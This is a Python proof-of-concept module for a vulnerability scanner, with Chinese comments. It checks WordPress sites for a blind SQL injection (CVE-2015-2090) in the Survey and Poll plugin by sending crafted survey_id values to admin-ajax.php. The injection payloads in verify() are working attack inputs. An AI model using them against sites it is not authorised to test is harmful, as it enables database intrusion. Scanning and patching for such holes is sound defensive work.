# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0079'  # 平台漏洞编号，留空
    name = 'WordPress Plugin Survey and Poll 1.1 - Blind SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-02-11'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        WordPress Plugin Survey and Poll 1.1 - Blind SQL Injection.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36054/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-2090'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin Survey and Poll 1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fb2d09ef-b0c0-4cf6-a4b6-d18d6a23184d'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save&survey_id=1\""
            payload1 = "/wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save&survey_id=1/**/and/**/1=2\""
            verify_url = arg + payload
            code, head, res, errcode, _ = hh.http(verify_url)
            # 先访问survey_id=1此时survey_id就存在了
            if code != 200:
                return
            verify_url = arg + payload1
            code, head, res, errcode, _ = hh.http(verify_url)
            # 再次访问survey_id=1/**/and/**/1=2
            # 存在返回updated，不存在返回success
            if code == 200 and 'success' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
